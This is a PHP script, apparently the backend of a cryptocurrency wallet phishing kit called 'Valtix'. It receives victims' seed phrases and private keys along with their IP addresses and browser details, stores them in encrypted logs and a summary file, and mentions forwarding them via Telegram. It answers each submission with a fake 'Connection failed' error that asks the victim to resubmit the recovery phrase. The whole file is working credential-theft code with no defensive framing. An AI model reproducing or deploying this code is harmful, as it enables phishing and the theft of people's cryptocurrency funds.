<?php
/**
 * collect.php — Valtix Capture Backend
 * Logs to file + captures wallet type. Telegram handled by sender.
 */

$ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
$ENCRYPTION_IV  = '1234567890abcdef';

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['error' => 'Method not allowed']));
}

$wallet     = $_POST['wallet'] ?? 'unknown';
$seed       = $_POST['seed'] ?? '';
$pkey       = $_POST['pkey'] ?? '';
$userAgent  = $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$pageUrl    = $_POST['pageUrl'] ?? 'unknown';
$screenSize = $_POST['screenSize'] ?? 'unknown';
$ip         = $_SERVER['REMOTE_ADDR'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'unknown');
$timestamp  = date('Y-m-d H:i:s');

$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) mkdir($logDir, 0755, true);

$record = [
    'id'            => uniqid('vt_', true),
    'wallet'        => $wallet,
    'ip'            => $ip,
    'userAgent'     => $userAgent,
    'pageUrl'       => $pageUrl,
    'screenSize'    => $screenSize,
    'seed'          => $seed ?: null,
    'pkey'          => $pkey ?: null,
    'seedWordCount' => $seed ? str_word_count($seed) : 0,
    'capturedAt'    => $timestamp
];

$plaintext  = json_encode($record);
$encrypted  = openssl_encrypt($plaintext, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV);
file_put_contents($logDir . '/captures.log', base64_encode($encrypted) . "\n", FILE_APPEND);

$summary = "$timestamp | {$record['id']} | Wallet: $wallet | IP: $ip | Seed: {$record['seedWordCount']} words | Key: " . ($pkey ? 'YES' : 'NO') . "\n";
file_put_contents($logDir . '/summary.log', $summary, FILE_APPEND);

echo json_encode([
    'success' => false,
    'error'   => 'Connection failed. Please verify your recovery phrase and try again.'
]);
